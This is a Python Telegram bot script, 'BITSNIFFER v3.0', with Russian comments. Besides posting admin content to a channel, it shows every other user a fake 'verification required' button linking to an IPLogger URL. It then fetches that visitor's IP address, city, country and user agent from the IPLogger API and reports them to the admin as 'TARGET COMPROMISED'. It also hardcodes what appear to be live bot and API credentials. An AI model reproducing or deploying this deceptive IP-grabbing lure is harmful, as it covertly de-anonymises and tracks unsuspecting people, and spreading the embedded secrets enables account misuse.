import asyncio
import re
import logging
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ СИСТЕМЫ ---
TOKEN = "8777973485:AAHg2x7ez-wCOMb1b9CEC-uaO4uKf4tVAxM"
IPLOGGER_API_KEY = "api_T34YFYm4xwWYl1Pfi2DjCFX78eCD3PZO"
LOGGER_ID = "hackpack"  # Имя вашего логгера
CHANNEL_ID = "@hackpackposter" 
MY_ADMIN_ID = 7917303098 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- СИСТЕМА ПЕРЕХВАТА IP ЧЕРЕЗ API ---

async def get_last_ip_intel():
    """Запрос данных напрямую из IPLogger API"""
    # Эндпоинт для получения статистики конкретного логгера
    url = f"https://api.iplogger.org/v1/loggers/{LOGGER_ID}/visitors?limit=1"
    headers = {"X-API-KEY": IPLOGGER_API_KEY}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    if data and "visitors" in data and len(data["visitors"]) > 0:
                        v = data["visitors"][0]
                        ip = v.get("ip", "N/A")
                        country = v.get("country", "Unknown")
                        city = v.get("city", "Unknown")
                        device = v.get("user_agent", "N/A")
                        return (f"🚀 <b>TARGET COMPROMISED:</b>\n"
                                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
                                f"📍 <b>LOC:</b> {city}, {country}\n"
                                f"📱 <b>OS/DEV:</b> {device}")
                else:
                    return f"⚠️ <b>API Error:</b> Status {response.status}"
    except Exception as e:
        return f"⚠️ <b>Connection Error:</b> {e}"
    return "📡 <b>LOG:</b> Пока новых данных нет."

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def clean_and_style(text: str, msg_type: str = "TEXT") -> str:
    if not text: text = ""
    text = re.sub(r'http\S+', '', text).replace("тихо", "").strip()
    tags = f"\n\n#{msg_type} #INTEL_DATA"
    signature = "\n<b>💀 SOURCE: @hackpackposter</b>"
    full_footer = tags + signature
    if msg_type != "TEXT" and len(text) + len(full_footer) > 1024:
        text = text[:(1021 - len(full_footer))] + "..."
    return text + full_footer

def get_post_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"), types.InlineKeyboardButton(text="👎", callback_data="dislike"))
    builder.row(types.InlineKeyboardButton(text="📡 SHARE ACCESS", url="https://t.me/hackpackposter"))
    return builder.as_markup()

def get_spy_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="🛡 ВЕРИФИКАЦИЯ", url="https://iplogger.com/2eCyg6"))
    builder.row(types.InlineKeyboardButton(text="🔄 СТАТУС ЗАХВАТА", callback_data="check_ip"))
    return builder.as_markup()

# --- ОБРАБОТЧИКИ СОБЫТИЙ ---

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    u = message.from_user
    if u.id == MY_ADMIN_ID:
        await message.answer(f"<b>BITSNIFFER v3.0 ONLINE.</b>\nNode: <code>{LOGGER_ID}</code> [Active]")
    else:
        await bot.send_message(MY_ADMIN_ID, f"<code>[DETECTED] {u.id} пытается войти.</code>")
        await message.answer("<b>ACCESS DENIED.</b> Пройдите верификацию узла.", reply_markup=get_spy_kb())

@dp.callback_query(F.data == "check_ip")
async def check_ip_callback(callback: types.CallbackQuery):
    """Мгновенная проверка логов через API"""
    intel = await get_last_ip_intel()
    await bot.send_message(MY_ADMIN_ID, intel)
    await callback.answer("Запрос в базу выполнен.")

@dp.message()
async def posting_handler(message: types.Message):
    if message.from_user.id == MY_ADMIN_ID:
        try:
            raw_text = message.text or message.caption or ""
            kb = get_post_kb()
            silent = "тихо" in raw_text.lower()
            
            if message.text:
                text = clean_and_style(raw_text, "TEXT")
                await bot.send_message(CHANNEL_ID, text, reply_markup=kb, disable_notification=silent)
            elif message.photo:
                text = clean_and_style(raw_text, "PHOTO")
                await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb, disable_notification=silent)
            elif message.video:
                text = clean_and_style(raw_text, "VIDEO")
                await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb, disable_notification=silent)
            elif message.document:
                text = clean_and_style(raw_text, "DOCUMENT")
                await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb, disable_notification=silent)

            await message.answer("🛠 <b>LOG: Packet sent.</b>")
        except Exception as e:
            await message.answer(f"❌ <b>ERROR:</b> {e}")
    else:
        await bot.send_message(MY_ADMIN_ID, f"📡 <b>DATA:</b> Пользователь {message.from_user.id} отправил сообщение.")
        await message.answer("<b>VERIFICATION REQUIRED.</b>", reply_markup=get_spy_kb())

async def main():
    print(f"--- BITSNIFFER v3.0 [{LOGGER_ID}] ONLINE ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Shutdown.")
